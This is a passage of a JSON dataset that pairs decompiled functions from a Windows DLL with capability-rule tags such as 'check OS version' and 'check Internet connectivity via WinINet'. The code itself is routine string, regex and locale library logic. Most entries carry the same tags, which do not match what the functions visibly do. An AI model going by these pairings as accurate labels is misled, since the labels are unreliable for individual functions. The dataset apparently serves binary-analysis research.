        "decompiled_code": "\nint64_t ** fcn.180012870(int64_t **arg1, int64_t arg2, int64_t arg3)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    int64_t **ppiVar4;\n    int64_t *piVar5;\n    uint64_t arg2_00;\n    \n    arg1[2] = NULL;\n    arg1[3] = 0xf;\n    *arg1 = 0;\n    arg2_00 = 0xffffffffffffffff;\n    iVar2 = -1;\n    do {\n        iVar2 = iVar2 + 1;\n    } while (*(iVar2 + arg3) != '\\0');\n    piVar3 = iVar2 + *(arg2 + 0x10);\n    piVar5 = arg1[2];\n    if (piVar3 != 0xf) {\n        if (arg1[3] < piVar3) {\n            fcn.1800137f0(arg1, piVar3 - piVar5);\n            arg1[2] = piVar5;\n        }\n        else if ((piVar3 < 0x10) && (0xf < arg1[3])) {\n            piVar3 = *arg1;\n            fcn.1800ade80(arg1, piVar3, piVar5 + 1);\n            piVar5 = piVar3;\n            if (0xfff < arg1[3] + 1U) {\n                piVar5 = piVar3[-1];\n                if (0x1f < piVar3 + (-8 - piVar5)) {\n                    fcn.1800b3528(piVar5, arg1[3] + 5);\n                    pcVar1 = swi(3);\n                    ppiVar4 = (*pcVar1)();\n                    return ppiVar4;\n                }\n            }\n            fcn.18008fb24(piVar5);\n            arg1[3] = 0xf;\n        }\n    }\n    fcn.18000dc30(arg1, arg2);\n    do {\n        arg2_00 = arg2_00 + 1;\n    } while (*(arg2_00 + arg3) != '\\0');\n    piVar5 = arg1[2];\n    if (arg1[3] - piVar5 < arg2_00) {\n        fcn.180014270(arg1, arg2_00, 0, arg3);\n    }\n    else {\n        arg1[2] = piVar5 + arg2_00;\n        ppiVar4 = arg1;\n        if (0xf < arg1[3]) {\n            ppiVar4 = *arg1;\n        }\n        fcn.1800ade80(ppiVar4 + piVar5, arg3, arg2_00);\n        (ppiVar4 + piVar5)[arg2_00] = 0;\n    }\n    return arg1;\n}\n",
        "token_count": 636
    },
    "18001306": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180013060(ushort *arg1, ulong *arg2, ulong arg3, int64_t arg4)\n\n{\n    int64_t *piVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    ulong *puVar4;\n    int64_t arg1_00;\n    int64_t iVar5;\n    uchar auStack168 [32];\n    ulong uStack136;\n    ushort *puStack128;\n    uint uStack104;\n    ulong uStack96;\n    ushort *puStack88;\n    uchar auStack80 [8];\n    ushort uStack72;\n    unkbyte6 Stack70;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint64_t uStack40;\n    \n    uStack96 = 0xfffffffffffffffe;\n    uStack40 = *0x180123080 ^ auStack168;\n    *(arg1 + 8) = 0;\n    *(arg1 + 0xc) = 7;\n    *arg1 = 0;\n    uStack104 = 1;\n    uStack56 = *0x180101900;\n    uStack52 = *0x180101904;\n    uStack48 = *0x180101908;\n    uStack44 = *0x18010190c;\n    uStack72 = 0;\n    iVar5 = -1;\n    do {\n        iVar5 = iVar5 + 1;\n    } while (*(arg4 + iVar5 * 2) != 0);\n    puStack88 = arg1;\n    fcn.180010d70(&uStack72, arg4, iVar5);\n    puVar4 = arg2;\n    if (7 < arg2[3]) {\n        puVar4 = *arg2;\n    }\n    piVar1 = arg2 + 2;\n    if (7 < arg2[3]) {\n        arg2 = *arg2;\n    }\n    puStack128 = &uStack72;\n    uStack136 = arg3;\n    fcn.180015730(auStack80, arg1, arg2, puVar4 + *piVar1 * 2);\n    if (7 < CONCAT44(uStack44, uStack48)) {\n        iVar5 = CONCAT44(uStack44, uStack48) * 2;\n        iVar3 = CONCAT62(Stack70, uStack72);\n        arg1_00 = iVar3;\n        if (0xfff < iVar5 + 2U) {\n            arg1_00 = *(iVar3 + -8);\n            if (0x1f < (iVar3 - arg1_00) - 8U) {\n                fcn.1800b3528(arg1_00, iVar5 + 0x29);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n    }\n    fcn.18008fb00(uStack40 ^ auStack168);\n    return;\n}\n",
        "token_count": 655
    },
    "18001319": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * fcn.180013190(uint *arg1, int64_t arg2, ulong arg3)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *puVar4;\n    int64_t arg4;\n    \n    arg4 = -1;\n    do {\n        arg4 = arg4 + 1;\n    } while (*(arg2 + arg4 * 2) != 0);\n    puVar4 = fcn.180014b80(arg3, arg2, arg2, arg4);\n    *(arg1 + 4) = 0;\n    *(arg1 + 6) = 0;\n    uVar1 = puVar4[1];\n    uVar2 = puVar4[2];\n    uVar3 = puVar4[3];\n    *arg1 = *puVar4;\n    arg1[1] = uVar1;\n    arg1[2] = uVar2;\n    arg1[3] = uVar3;\n    uVar1 = puVar4[5];\n    uVar2 = puVar4[6];\n    uVar3 = puVar4[7];\n    arg1[4] = puVar4[4];\n    arg1[5] = uVar1;\n    arg1[6] = uVar2;\n    arg1[7] = uVar3;\n    *(puVar4 + 4) = 0;\n    *(puVar4 + 6) = 7;\n    *puVar4 = 0;\n    return arg1;\n}\n",
        "token_count": 339
    },
    "1800131f": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.1800131f0(int64_t *arg1, ulong arg2, uint64_t arg3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    ulong *puVar3;\n    code *pcVar4;\n    ulong *puVar5;\n    uchar (*arg2_00) [16];\n    uchar *arg1_00;\n    uint64_t uVar6;\n    uchar auStack248 [32];\n    uchar (*pauStack216) [16];\n    ulong uStack208;\n    uchar (*pauStack200) [16];\n    uchar auStack184 [16];\n    uchar auStack168 [16];\n    uchar auStack152 [16];\n    uchar auStack136 [16];\n    uchar auStack120 [16];\n    uchar auStack104 [16];\n    uchar auStack88 [16];\n    uchar auStack72 [16];\n    ulong uStack56;\n    uint64_t uStack32;\n    \n    uStack208 = 0xfffffffffffffffe;\n    uStack32 = *0x180123080 ^ auStack248;\n    auStack120 = ZEXT816(0);\n    auStack104 = ZEXT816(0);\n    auStack88 = ZEXT816(0);\n    auStack72 = ZEXT816(0);\n    uStack56 = 0;\n    auStack184 = CONCAT88(arg2, arg2);\n    auStack168 = ZEXT816(arg3);\n    auStack152 = ZEXT816(0);\n    auStack136 = ZEXT816(0);\n    pauStack216 = fcn.18008fb2c(0x30);\n    *pauStack216 = ZEXT816(0);\n    pauStack216[1] = ZEXT816(0);\n    pauStack216[2] = ZEXT816(0);\n    *(*pauStack216 + 8) = 0x14;\n    *pauStack216[1] = 0;\n    *(pauStack216[1] + 8) = 0;\n    **pauStack216 = vtable.std::_Root_node.0;\n    *(pauStack216[2] + 4) = 0;\n    *(pauStack216[2] + 0xc) = 0;\n    auStack104 = CONCAT124(auStack104._4_12_, 1);\n    auStack104 = CONCAT88(arg1 + 1, auStack104._0_8_);\n    auStack88 = CONCAT88(arg1 + 1, 0x400000100);\n    auStack72 = CONCAT124(auStack72._4_12_, 1);\n    uStack56 = CONCAT44(uStack56._4_4_, 0x8775dfb);\n    auStack120._0_8_ = pauStack216;\n    auStack120._8_8_ = pauStack216;\n    fcn.180015150(auStack184);\n    pauStack216 = auStack120;\n    arg2_00 = fcn.18008fb2c(0x28);\n    *arg2_00 = ZEXT816(0);\n    arg2_00[1] = ZEXT816(0);\n    *arg2_00[2] = 0;\n    *(*arg2_00 + 8) = 0xd;\n    *arg2_00[1] = 0;\n    *(arg2_00[1] + 8) = 0;\n    **arg2_00 = vtable.std::_Node_capture.0;\n    *arg2_00[2] = 0;\n    *(arg2_00[1] + 8) = auStack120._8_8_;\n    if (*auStack120._8_8_[1] != 0) {\n        *arg2_00[1] = *auStack120._8_8_[1];\n        *(*auStack120._8_8_[1] + 0x18) = arg2_00;\n    }\n    *auStack120._8_8_[1] = arg2_00;\n    auStack120 = CONCAT88(arg2_00, auStack120._0_8_);\n    arg1_00 = auStack184;\n    pauStack200 = arg2_00;\n    fcn.180015400(arg1_00);\n    if (auStack184._0_8_ != auStack168._0_8_) {\ncode_r0x000180013455:\n        fcn.180015140(arg1_00, 0xe);\n        pcVar4 = swi(3);\n        (*pcVar4)();\n        return;\n    }\n    fcn.180015670(auStack120, arg2_00);\n    fcn.180015eb0(auStack120, 0x15);\n    *(auStack120._0_8_ + 0x20) = auStack72._0_4_;\n    *(auStack120._0_8_ + 0x28) = auStack168._8_4_ + 1;\n    fcn.180003c40(auStack120._0_8_, 0, 0);\n    LOCK();\n    *(auStack120._0_8_ + 0x2c) = *(auStack120._0_8_ + 0x2c) + 1;\n    if (*arg1 != 0) {\n        LOCK();\n        piVar1 = *arg1 + 0x2c;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar2 == 1) {\n            puVar5 = *arg1;\n            while (puVar5 != NULL) {\n                puVar3 = puVar5[2];\n                puVar5[2] = 0;\n                (***puVar5)(puVar5, 1);\n                puVar5 = puVar3;\n            }\n        }\n    }\n    *arg1 = auStack120._0_8_;\n    if (auStack152._0_8_ != NULL) {\n        uVar6 = auStack136._0_8_ - auStack152._0_8_ & 0xfffffffffffffffc;\n        arg1_00 = auStack152._0_8_;\n        if (0xfff < uVar6) {\n            arg1_00 = *(auStack152._0_8_ + -8);\n            if (0x1f < auStack152._0_8_ + (-8 - arg1_00)) {\n                fcn.1800b3528(arg1_00, uVar6 + 0x27);\n                goto code_r0x000180013455;\n            }\n        }\n        fcn.18008fb24(arg1_00);\n    }\n    fcn.18008fb00(uStack32 ^ auStack248);\n    return;\n}\n",
        "token_count": 1491
    },
    "18001346": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.180013460(int64_t arg1, uint64_t arg2, uint64_t arg3, uint16_t *arg4)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint16_t *puVar3;\n    int64_t iVar4;\n    uint16_t *puVar5;\n    uint64_t uVar6;\n    bool bVar7;\n    bool bVar8;\n    uint64_t in_stack_00000028;\n    \n    if ((in_stack_00000028 <= arg2) && (arg3 <= arg2 - in_stack_00000028)) {\n        if (in_stack_00000028 == 0) {\n            return arg3;\n        }\n        uVar2 = *arg4;\n        puVar3 = arg1 + arg3 * 2;\n        while( true ) {\n            iVar4 = (arg1 + (arg2 - in_stack_00000028) * 2 + 2) - puVar3 >> 1;\n            puVar5 = NULL;\n            if (iVar4 != 0) {\n                uVar1 = *puVar3;\n                for (; (puVar5 = puVar3,  uVar1 != uVar2 && (puVar5 = NULL,  iVar4 != 1)); iVar4 = iVar4 + -1) {\n                    puVar3 = puVar3 + 1;\n                    uVar1 = *puVar3;\n                }\n            }\n            if (puVar5 == NULL) break;\n            uVar1 = *puVar5;\n            if (uVar2 <= uVar1) {\n                bVar7 = uVar1 < uVar2;\n                bVar8 = uVar1 == uVar2;\n                puVar3 = arg4;\n                uVar6 = in_stack_00000028;\n                do {\n                    if (!bVar7 && !bVar8) break;\n                    if (uVar6 == 1) {\n                        return puVar5 - arg1 >> 1;\n                    }\n                    uVar1 = *(puVar5 + (2 - arg4) + puVar3);\n                    puVar3 = puVar3 + 1;\n                    uVar6 = uVar6 - 1;\n                    bVar7 = uVar1 < *puVar3;\n                    bVar8 = uVar1 == *puVar3;\n                } while (!bVar7);\n            }\n            puVar3 = puVar5 + 1;\n        }\n    }\n    return 0xffffffffffffffff;\n}\n",
        "token_count": 548
    },
    "18001394": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180013940(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t *piVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uchar auStack104 [32];\n    ulong uStack72;\n    uchar auStack64 [24];\n    uchar auStack40 [4];\n    uchar auStack36 [4];\n    int64_t *piStack32;\n    uint64_t uStack24;\n    \n    uStack72 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack104;\n    fcn.18006da30(auStack36, 0);\n    piVar2 = *0x18012a188;\n    piStack32 = *0x18012a188;\n    if (*0x18012b0d8 == 0) {\n        fcn.18006da30(auStack40, 0);\n        if (*0x18012b0d8 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x18012b0d8 = *0x1801286b8;\n        }\n        fcn.18006dab0(auStack40);\n    }\n    uVar3 = *0x18012b0d8;\n    iVar4 = *(arg1 + 8);\n    if (*0x18012b0d8 < *(iVar4 + 0x18)) {\n        iVar5 = *(*(iVar4 + 0x10) + *0x18012b0d8 * 8);\n        if (iVar5 != 0) goto code_r0x000180013a47;\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (*(iVar4 + 0x24) == '\\0') {\ncode_r0x000180013a03:\n        if (iVar5 != 0) goto code_r0x000180013a47;\n    }\n    else {\n        iVar4 = fcn.180073b5c();\n        if (uVar3 < *(iVar4 + 0x18)) {\n            iVar5 = *(*(iVar4 + 0x10) + uVar3 * 8);\n            goto code_r0x000180013a03;\n        }\n    }\n    if (piVar2 == NULL) {\n        iVar4 = fcn.180014780(&piStack32, arg1);\n        piVar2 = piStack32;\n        if (iVar4 == -1) {\n            fcn.180002310(auStack64);\n            fcn.1800add8c(auStack64, 0x18011f808);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.180073b24(piStack32);\n        (**(*piVar2 + 8))(piVar2);\n        *0x18012a188 = piVar2;\n    }\ncode_r0x000180013a47:\n    fcn.18006dab0(auStack36);\n    fcn.18008fb00(uStack24 ^ auStack104);\n    return;\n}\n",
        "token_count": 702
    },
    "18001440": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180014400(int64_t arg1)\n\n{\n    code *pcVar1;\n    int64_t *piVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uchar auStack104 [32];\n    ulong uStack72;\n    uchar auStack64 [24];\n    uchar auStack40 [4];\n    uchar auStack36 [4];\n    int64_t *piStack32;\n    uint64_t uStack24;\n    \n    uStack72 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack104;\n    fcn.18006da30(auStack36, 0);\n    piVar2 = *0x18012a198;\n    piStack32 = *0x18012a198;\n    if (*0x18012b0c0 == 0) {\n        fcn.18006da30(auStack40, 0);\n        if (*0x18012b0c0 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x18012b0c0 = *0x1801286b8;\n        }\n        fcn.18006dab0(auStack40);\n    }\n    uVar3 = *0x18012b0c0;\n    iVar4 = *(arg1 + 8);\n    if (*0x18012b0c0 < *(iVar4 + 0x18)) {\n        iVar5 = *(*(iVar4 + 0x10) + *0x18012b0c0 * 8);\n        if (iVar5 != 0) goto code_r0x000180014507;\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (*(iVar4 + 0x24) == '\\0') {\ncode_r0x0001800144c3:\n        if (iVar5 != 0) goto code_r0x000180014507;\n    }\n    else {\n        iVar4 = fcn.180073b5c();\n        if (uVar3 < *(iVar4 + 0x18)) {\n            iVar5 = *(*(iVar4 + 0x10) + uVar3 * 8);\n            goto code_r0x0001800144c3;\n        }\n    }\n    if (piVar2 == NULL) {\n        iVar4 = fcn.180014980(&piStack32, arg1);\n        piVar2 = piStack32;\n        if (iVar4 == -1) {\n            fcn.180002310(auStack64);\n            fcn.1800add8c(auStack64, 0x18011f808);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.180073b24(piStack32);\n        (**(*piVar2 + 8))(piVar2);\n        *0x18012a198 = piVar2;\n    }\ncode_r0x000180014507:\n    fcn.18006dab0(auStack36);\n    fcn.18008fb00(uStack24 ^ auStack104);\n    return;\n}\n",
        "token_count": 701
    },
    "18001456": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180014560(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t *piVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uchar auStack104 [32];\n    ulong uStack72;\n    uchar auStack64 [24];\n    uchar auStack40 [4];\n    uchar auStack36 [4];\n    int64_t *piStack32;\n    uint64_t uStack24;\n    \n    uStack72 = 0xfffffffffffffffe;\n    uStack24 = *0x180123080 ^ auStack104;\n    fcn.18006da30(auStack36, 0);\n    piVar3 = *0x18012a1a0;\n    piStack32 = *0x18012a1a0;\n    if (*0x1801286c8 == 0) {\n        fcn.18006da30(auStack40, 0);\n        if (*0x1801286c8 == 0) {\n            *0x1801286b8 = *0x1801286b8 + 1;\n            *0x1801286c8 = *0x1801286b8;\n        }\n        fcn.18006dab0(auStack40);\n    }\n    uVar2 = *0x1801286c8;\n    iVar4 = *(arg1 + 8);\n    if (*0x1801286c8 < *(iVar4 + 0x18)) {\n        iVar5 = *(*(iVar4 + 0x10) + *0x1801286c8 * 8);\n        if (iVar5 != 0) goto code_r0x000180014667;\n    }\n    else {\n        iVar5 = 0;\n    }\n    if (*(iVar4 + 0x24) == '\\0') {\ncode_r0x000180014623:\n        if (iVar5 != 0) goto code_r0x000180014667;\n    }\n    else {\n        iVar4 = fcn.180073b5c();\n        if (uVar2 < *(iVar4 + 0x18)) {\n            iVar5 = *(*(iVar4 + 0x10) + uVar2 * 8);\n            goto code_r0x000180014623;\n        }\n    }\n    if (piVar3 == NULL) {\n        iVar4 = fcn.180003080(&piStack32, arg1);\n        piVar3 = piStack32;\n        if (iVar4 == -1) {\n            fcn.180002310(auStack64);\n            fcn.1800add8c(auStack64, 0x18011f808);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.180073b24(piStack32);\n        (**(*piVar3 + 8))(piVar3);\n        *0x18012a1a0 = piVar3;\n    }\ncode_r0x000180014667:\n    fcn.18006dab0(auStack36);\n    fcn.18008fb00(uStack24 ^ auStack104);\n    return;\n}\n",
        "token_count": 697
    },
    "18001478": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.180014780(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    code **ppcVar3;\n    ulong uVar4;\n    int64_t arg2_00;\n    uchar auStack128 [8];\n    int64_t iStack120;\n    uchar uStack112;\n    int64_t iStack104;\n    uchar uStack96;\n    int64_t iStack88;\n    ushort uStack80;\n    int64_t iStack72;\n    ushort uStack64;\n    int64_t iStack56;\n    uchar uStack48;\n    int64_t iStack40;\n    uchar uStack32;\n    \n    if ((arg1 != NULL) && (*arg1 == 0)) {\n        ppcVar3 = fcn.18008fb2c(0x10);\n        iVar1 = *(arg2 + 8);\n        if (iVar1 == 0) {\n            arg2_00 = 0x1800f454f;\n        }\n        else {\n            arg2_00 = *(iVar1 + 0x28);\n            if (arg2_00 == 0) {\n                arg2_00 = iVar1 + 0x30;\n            }\n        }\n        fcn.18006da30(auStack128, 0);\n        iStack120 = 0;\n        uStack112 = 0;\n        iStack104 = 0;\n        uStack96 = 0;\n        iStack88 = 0;\n        uStack80 = 0;\n        iStack72 = 0;\n        uStack64 = 0;\n        iStack56 = 0;\n        uStack48 = 0;\n        iStack40 = 0;\n        uStack32 = 0;\n        if (arg2_00 == 0) {\n            fcn.18006dfd0(\"bad locale name\");\n            pcVar2 = swi(3);\n            uVar4 = (*pcVar2)();\n            return uVar4;\n        }\n        fcn.180073c8c(auStack128, arg2_00);\n        *(ppcVar3 + 1) = 0;\n        *ppcVar3 = vtable.std::codecvt_char__char__struct__Mbstatet_.0;\n        *arg1 = ppcVar3;\n        fcn.180073cf8(auStack128);\n        if (iStack40 != 0) {\n            fcn.1800b2bb8(iStack40);\n        }\n        iStack40 = 0;\n        if (iStack56 != 0) {\n            fcn.1800b2bb8(iStack56);\n        }\n        iStack56 = 0;\n        if (iStack72 != 0) {\n            fcn.1800b2bb8(iStack72);\n        }\n        iStack72 = 0;\n        if (iStack88 != 0) {\n            fcn.1800b2bb8(iStack88);\n        }\n        iStack88 = 0;\n        if (iStack104 != 0) {\n            fcn.1800b2bb8(iStack104);\n        }\n        iStack104 = 0;\n        if (iStack120 != 0) {\n            fcn.1800b2bb8(iStack120);\n        }\n        iStack120 = 0;\n        fcn.18006dab0(auStack128);\n    }\n    return 2;\n}\n",
        "token_count": 752
    },
    "180015ab": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.180015ab0(int16_t **arg1)\n\n{\n    int16_t *piVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    char cVar4;\n    uint64_t noname_0;\n    int16_t **ppiVar5;\n    int16_t *piVar6;\n    ulong arg2;\n    \n    uVar2 = *(arg1 + 0x7c);\n    do {\n        if ((uVar2 == 0xffffffff) || (noname_0 = uVar2,  uVar2 == 0x7c)) {\n            return;\n        }\n        if (uVar2 == 0x29) {\n            if (*(arg1 + 0x1c) != 0) {\n                return;\n            }\n            if ((*(arg1 + 0x10) & 0x10000000) == 0) {\n                fcn.180015140(noname_0, 5);\n                pcVar3 = swi(3);\n                (*pcVar3)();\n                return;\n            }\ncode_r0x000180015ddd:\n            fcn.180016d00(arg1 + 8);\ncode_r0x000180015dea:\n            piVar6 = *arg1;\n            if (piVar6 != arg1[2]) {\n                if (((*piVar6 == 0x5c) && (piVar1 = piVar6 + 1,  piVar1 != arg1[2])) &&\n                   ((((*(arg1 + 0x10) & 8) == 0 && (*piVar1 - 0x28U < 2)) ||\n                    (((*(arg1 + 0x10) & 0x10) == 0 && ((*piVar1 - 0x7bU & 0xfffd) == 0)))))) {\n                    piVar6 = piVar1;\n                }\n                *arg1 = piVar6 + 1;\n            }\n            fcn.180015150(arg1);\ncode_r0x000180015e43:\n            fcn.180016a80(arg1);\n        }\n        else {\n            if (uVar2 == 0x2e) {\n                fcn.180015eb0(arg1 + 8, 5);\n                goto code_r0x000180015dea;\n            }\n            if (uVar2 == 0x5c) {\n                piVar6 = *arg1;\n                if (piVar6 != arg1[2]) {\n                    if (((*piVar6 == 0x5c) && (piVar1 = piVar6 + 1,  piVar1 != arg1[2])) &&\n                       ((((*(arg1 + 0x10) & 8) == 0 && (*piVar1 - 0x28U < 2)) ||\n                        (((*(arg1 + 0x10) & 0x10) == 0 && ((*piVar1 - 0x7bU & 0xfffd) == 0)))))) {\n                        piVar6 = piVar1;\n                    }\n                    *arg1 = piVar6 + 1;\n                }\n                fcn.180015150(arg1);\n                if ((*(arg1 + 0x10) & 0x80) != 0) {\n                    if (*(arg1 + 0xf) == 0x62) {\n                        arg2 = 4;\n                        goto code_r0x000180015d2c;\n                    }\n                    if (*(arg1 + 0xf) == 0x42) {\n                        fcn.180015eb0(arg1 + 8, 4);\n                        *(arg1[9] + 6) = *(arg1[9] + 6) ^ 1;\n                        goto code_r0x000180015d35;\n                    }\n                }\n                fcn.180016670(arg1);\n                goto code_r0x000180015e43;\n            }\n            if (uVar2 == 0x5b) {\n                piVar6 = *arg1;\n                if (piVar6 != arg1[2]) {\n                    if (((*piVar6 == 0x5c) && (piVar1 = piVar6 + 1,  piVar1 != arg1[2])) &&\n                       ((((*(arg1 + 0x10) & 8) == 0 && (*piVar1 - 0x28U < 2)) ||\n                        (((*(arg1 + 0x10) & 0x10) == 0 && ((*piVar1 - 0x7bU & 0xfffd) == 0)))))) {\n                        piVar6 = piVar1;\n                    }\n                    *arg1 = piVar6 + 1;\n                }\n                fcn.180015150(arg1);\n                ppiVar5 = arg1;\n                fcn.1800164d0(arg1);\n                if (*(arg1 + 0x7c) != 0x5d) {\n                    fcn.180015140(ppiVar5, 4);\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n                goto code_r0x000180015dea;\n            }\n            if (uVar2 == 0x28) {\n                piVar6 = *arg1;\n                if (piVar6 != arg1[2]) {\n                    if (((*piVar6 == 0x5c) && (piVar1 = piVar6 + 1,  piVar1 != arg1[2])) &&\n                       ((((*(arg1 + 0x10) & 8) == 0 && (*piVar1 - 0x28U < 2)) ||\n                        (((*(arg1 + 0x10) & 0x10) == 0 && ((*piVar1 - 0x7bU & 0xfffd) == 0)))))) {\n                        piVar6 = piVar1;\n                    }\n                    *arg1 = piVar6 + 1;\n                }\n                fcn.180015150(arg1);\n                ppiVar5 = arg1;\n                cVar4 = fcn.1800167f0(arg1);\n                if (*(arg1 + 0x7c) != 0x29) {\n                    fcn.180015140(ppiVar5, 5);\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n                piVar6 = *arg1;\n                if (piVar6 != arg1[2]) {\n                    if (((*piVar6 == 0x5c) && (piVar1 = piVar6 + 1,  piVar1 != arg1[2])) &&\n                       ((((*(arg1 + 0x10) & 8) == 0 && (*piVar1 - 0x28U < 2)) ||\n                        (((*(arg1 + 0x10) & 0x10) == 0 && ((*piVar1 - 0x7bU & 0xfffd) == 0)))))) {\n                        piVar6 = piVar1;\n                    }\n                    *arg1 = piVar6 + 1;\n                }\n                fcn.180015150(arg1);\n                if (cVar4 != '\\0') goto code_r0x000180015e43;\n            }\n            else {\n                if (uVar2 == 0x5e) {\n                    arg2 = 2;\n                }\n                else {\n                    if (uVar2 != 0x24) {\n                        if (((uVar2 - 0x2a < 2) || (uVar2 == 0x3f)) || (uVar2 == 0x7b)) {\n                            fcn.180015140(noname_0, 10);\n                            pcVar3 = swi(3);\n                            (*pcVar3)();\n                            return;\n                        }\n                        if (uVar2 == 0x7d) {\n                            if ((*(arg1 + 0x10) & 0x10000000) == 0) {\n                                fcn.180015140(noname_0, 6);\n                                pcVar3 = swi(3);\n                                (*pcVar3)();\n                                return;\n                            }\n                        }\n                        else if ((uVar2 == 0x5d) && ((*(arg1 + 0x10) & 0x10000000) == 0)) {\n                            fcn.180015140(noname_0, 4);\n                            pcVar3 = swi(3);\n                            (*pcVar3)();\n                            return;\n                        }\n                        goto code_r0x000180015ddd;\n                    }\n                    arg2 = 3;\n                }\ncode_r0x000180015d2c:\n                fcn.180015eb0(arg1 + 8, arg2);\ncode_r0x000180015d35:\n                piVar6 = *arg1;\n                if (piVar6 != arg1[2]) {\n                    if (((*piVar6 == 0x5c) && (piVar1 = piVar6 + 1,  piVar1 != arg1[2])) &&\n                       ((((*(arg1 + 0x10) & 8) == 0 && (*piVar1 - 0x28U < 2)) ||\n                        (((*(arg1 + 0x10) & 0x10) == 0 && ((*piVar1 - 0x7bU & 0xfffd) == 0)))))) {\n                        piVar6 = piVar1;\n                    }\n                    *arg1 = piVar6 + 1;\n                }\n                fcn.180015150(arg1);\n            }\n        }\n        uVar2 = *(arg1 + 0x7c);\n    } while( true );\n}\n",
        "token_count": 2123
    },
    "180016a8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
